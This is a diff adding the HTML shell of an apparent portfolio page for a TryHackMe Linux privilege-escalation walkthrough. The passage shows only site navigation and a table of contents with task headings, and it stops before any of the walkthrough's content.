@@ -1,0 +1,2364 @@
+<!DOCTYPE html><html lang="en" class="no-js"><head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="THM, eCPPT, Offensive Security Portfolio">
+      
+      
+      
+        <link rel="canonical" href="https://c0rnyx.github.io/redops-journal/thm/room-walkthroughs/linux-privilege-escalation-automation/">
+      
+      
+        <link rel="prev" href="../linux-privilege-escalation/">
+      
+      
+        <link rel="next" href="../netsec-challenge/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Linux Privilege Escalation Automation - RedOps Journal</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  <link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            .gscrollbar-fixer { padding-right: 15px; }
+            .gdesc-inner { font-size: 0.75rem; }
+            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
+            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
+            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
+        </style></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#linux-privilege-escalation-automation-tryhackme-room-walkthrough" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="RedOps Journal" class="md-header__button md-logo" aria-label="RedOps Journal" data-md-component="logo">
+      
+  <img src="../../../assets/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            RedOps Journal
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Linux Privilege Escalation Automation
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-hidden="true" type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required="">
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix="">
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../mock-pentests/" class="md-tabs__link">
+          
+  
+  
+  Mock Pentest Reports
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../" class="md-tabs__link">
+          
+  
+  
+  Room Walkthroughs
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../linux/" class="md-tabs__link">
+          
+  
+  
+  Linux Practice
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../aboutme/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About Me
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="RedOps Journal" class="md-nav__button md-logo" aria-label="RedOps Journal" data-md-component="logo">
+      
+  <img src="../../../assets/logo.svg" alt="logo">
+
+    </a>
+    RedOps Journal
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix="">
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2">
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mock Pentest Reports
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Mock Pentest Reports
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Index
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/agent-sudo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Agent Sudo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/anonymous/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anonymous
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/bounty-hacker/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bounty Hacker
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/eternal-blue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Eternal Blue
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/kenobi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kenobi
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/lazy-admin/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lazy Admin
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/lazy-admin-cz/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lazy Admin (CZ)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/mr-robot/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mr. Robot
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/mr-robot-cz/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mr. Robot (CZ)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/root-me/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Root Me
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/smag-grotto/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Smag Grotto
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/smol/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Smol
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/smol-cz/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Smol (CZ)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/tools-rus/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ToolsRus
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mock-pentests/vulnversity/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vulnversity
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked="">
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Room Walkthroughs
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Room Walkthroughs
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Index
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../breaching-ad/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Breaching AD
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../easy-peasy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Easy Peasy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux-fundamentals-part-3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Fundamentals Part 3
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux-privilege-escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Privilege Escalation Automation
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Privilege Escalation Automation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Introduction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2-automated-enumeration-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Task 2: Automated Enumeration Tools
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 2: Automated Enumeration Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#common-enumeration-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Enumeration Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Questions:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-3-public-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Task 3: Public Exploits
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 3: Public Exploits">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#methodology-for-using-public-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Methodology for Using Public Exploits
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-exploit-the-previously-identified-vulnerability-what-is-the-content-of-rootflagtxt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Question: Exploit the previously identified vulnerability. What is the content of /root/flag.txt?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-4-process-monitoring-with-pspy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Task 4: Process Monitoring with pspy
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 4: Process Monitoring with pspy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-is-pspy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What is pspy?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how-it-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How it works
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation Scenario
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#questions_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Questions:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-5-challenge-writeup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Task 5: Challenge Writeup
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 5: Challenge Writeup">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-initial-access-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Initial Access &amp; Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-shell-as-user-frank" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Shell as user frank
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-shell-as-root-ld_preload-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Shell as root - LD_PRELOAD Abuse
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conclusion
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../netsec-challenge/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Net Sec Challenge
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../network-services/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Services
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../network-services-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Services 2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../penetration-testing-frameworks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Penetration Testing Frameworks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../post-exploitation-basics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Post Exploitation Basics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../take-over/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Take over
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windows-internals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Internals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4">
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Practice
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux Practice
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Index
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../linux/levels%201-10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bandit - levels 1 to 10
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../linux/levels%2011-20/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bandit - levels 11 to 20
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../linux/levels%2021-33/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bandit - levels 21 to 33
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../aboutme/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About Me
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Introduction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2-automated-enumeration-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Task 2: Automated Enumeration Tools
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 2: Automated Enumeration Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#common-enumeration-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Enumeration Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Questions:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-3-public-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Task 3: Public Exploits
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 3: Public Exploits">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#methodology-for-using-public-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Methodology for Using Public Exploits
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-exploit-the-previously-identified-vulnerability-what-is-the-content-of-rootflagtxt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Question: Exploit the previously identified vulnerability. What is the content of /root/flag.txt?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-4-process-monitoring-with-pspy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Task 4: Process Monitoring with pspy
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 4: Process Monitoring with pspy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-is-pspy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What is pspy?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how-it-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How it works
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
